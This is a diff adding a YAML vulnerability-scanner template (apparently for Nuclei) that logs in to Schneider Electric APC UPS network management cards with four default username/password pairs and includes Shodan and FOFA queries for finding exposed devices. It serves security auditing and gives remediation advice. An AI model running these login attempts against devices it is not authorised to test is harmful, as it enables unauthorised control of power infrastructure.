@@ -1,0 +1,79 @@
+id: schneider-electric-default-login
+
+info:
+  name: Schneider Electric - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    Schneider Electric APC UPS Network Management Cards may retain default or weak account credentials. This template checks known credential pairs against the card's web login interface.
+  impact: |
+    An attacker can access UPS monitoring or management functions with the permissions of the compromised account.
+  remediation: |
+    Replace default credentials for every enabled account, disable unused accounts, and restrict access to the UPS management network.
+  reference:
+    - https://iportal.se.com/Contents/docs/UPS-PMAR-9LLJMN_R0_EN.PDF
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    verified: true
+    max-request: 5
+    shodan-query: 'title:"APC | Log On"'
+    fofa-query: 'title="APC | Log On"'
+    vendor: schneider-electric
+    product: ups_network_management_card
+  tags: default-login,schneider,schneider-electric,apc,ups,intrusive
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /home.htm HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: header
+        regex:
+          - '/NMC/([^/]+)/logon\.htm'
+        internal: true
+
+  - raw:
+      - |
+        POST /NMC/{{token}}/Forms/login1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: http://{{Hostname}}/NMC/{{token}}/logon.htm
+
+        prefLanguage=00000000&login_username={{username}}&login_password={{password}}&submit=Log+On
+
+    payloads:
+      username:
+        - apc
+        - admin
+        - device
+        - readonly
+      password:
+        - apc
+        - admin
+        - apc
+        - apc
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 303
+
+      - type: regex
+        part: header
+        regex:
+          - "(?i)Location: .*/NMC/"
+
+      - type: regex
+        part: header
+        regex:
+          - "(?i)Set-Cookie: APC[^=]+=[^;]+"
